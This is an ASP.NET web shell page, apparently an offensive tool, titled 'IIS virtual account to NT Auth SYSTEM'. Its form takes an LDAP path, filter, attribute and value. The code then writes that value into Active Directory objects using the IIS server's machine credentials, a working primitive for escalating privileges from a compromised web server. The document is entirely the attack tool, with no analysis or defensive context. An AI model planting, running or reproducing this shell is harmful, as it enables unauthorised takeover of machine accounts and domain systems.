<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System" %>
<%@ Assembly Name="System.DirectoryServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" %>
<%@ Import Namespace="System.DirectoryServices" %>

<html>
<head>
    <title>--==[[ Certi-Bhai ]]==--</title>
</head>
<STYLE>
body {
font-size: 18px;
font-family: monospace;
color: #db996e;
background: black;
}

input {
border			: solid 1px ;
border-color		: black;
BACKGROUND-COLOR: #444444;
font: 8pt Verdana;

color: white;
}

submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}

#t input[type=\'submit\']{
	COLOR: White;
	border:none;
	BACKGROUND-COLOR: black;
}

#t input[type=\'submit\']:hover {
	
	BACKGROUND-COLOR: #ff9933;
	color: black;
	
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 0px ;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 2px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: #191919;;
color: #FFF;
}
textarea {
border			: dashed 2px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
A:link {
border: 1px;
	COLOR: red; TEXT-DECORATION: none
}
A:visited {
	COLOR: red; TEXT-DECORATION: none
}
A:hover {
	color: White; TEXT-DECORATION: none
}
A:active {
	color: white; TEXT-DECORATION: none
}
</STYLE>
<body>
   <table width="100%" cellspacing="0" cellpadding="0" class="tb1" >

			

       <td width="100%" align=center valign="top" rowspan="1">
           <font color=#ff9933 size=15 face="comic sans ms"><b>--==[[ IIS virtual account to NT Auth SYSTEM ]]==--</font> <div class="hedr"> 

        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="100%" align="center" valign="top" rowspan="1"><font 
        color="red" face="comic sans ms"size="1"><b> 
        <font color=#ff9933> 
        ##########################################</font><font color=white>#############################################</font><font color=green>#############################################</font><br><font color=white>
       </td></tr></table>
</div><br><div align=center>

    <form method="post">
        
        <label>Object filter </label>
        <input type="text" name="ldapFilter" size="40"  required /><br /><br />

        <label>Attribute </label>
        <input type="text" name="attrName" size="40" required /><br /><br />
	
	<label>LDAP</label>
        <input type="text" name="ldapPath" size="70" required /><br /><br />


        <label>Attribute value</label> <br />
      
	<textarea name="newValue" rows="24" cols="70" required></textarea><br><br>

        <input type="submit" value="Chal billu, Ghuma de sodda \m/" />
    </form>

    <%
        if (Request.HttpMethod == "POST")
        {
            string ldapPath = Request.Form["ldapPath"];
            string ldapFilter = Request.Form["ldapFilter"];
            string attrName = Request.Form["attrName"];
            string newValue = Request.Form["newValue"];

            try
            {
                using (DirectoryEntry entry = new DirectoryEntry(ldapPath)) // Uses machine credentials
                {
                    using (DirectorySearcher searcher = new DirectorySearcher(entry))
                    {
                        searcher.Filter = ldapFilter;
                        searcher.PropertiesToLoad.Add(attrName);

                        SearchResult result = searcher.FindOne();

                        if (result != null)
                        {
                            DirectoryEntry userEntry = result.GetDirectoryEntry();

                            if (!string.IsNullOrEmpty(newValue))
                            {
                                userEntry.Properties[attrName].Value = newValue;
                                userEntry.CommitChanges();

                                Response.Write("<div class='result' style='color:lime;'>Attribute updated successfully!</div>");
                            }

                            // Show current attribute value(s)
                            if (userEntry.Properties.Contains(attrName))
                            {
                                Response.Write("<div class='result'><b>Current value(s) of '" + attrName + "':</b><br><br>");
                                foreach (object val in userEntry.Properties[attrName])
                                {
                                    Response.Write(Server.HtmlEncode(val.ToString()) + "<br>");
                                }
                                Response.Write("</div>");
                            }
                            else
                            {
                                Response.Write("<div class='result' style='color:orange;'>Attribute exists but has no value set.</div>");
                            }
                        }
                        else
                        {
                            Response.Write("<div class='result' style='color:red;'>LDAP object not found using given filter.</div>");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Response.Write("<div class='result' style='color:red;'>Error: " + Server.HtmlEncode(ex.Message) + "</div>");
            }
        }
    %>
</body>
</html>
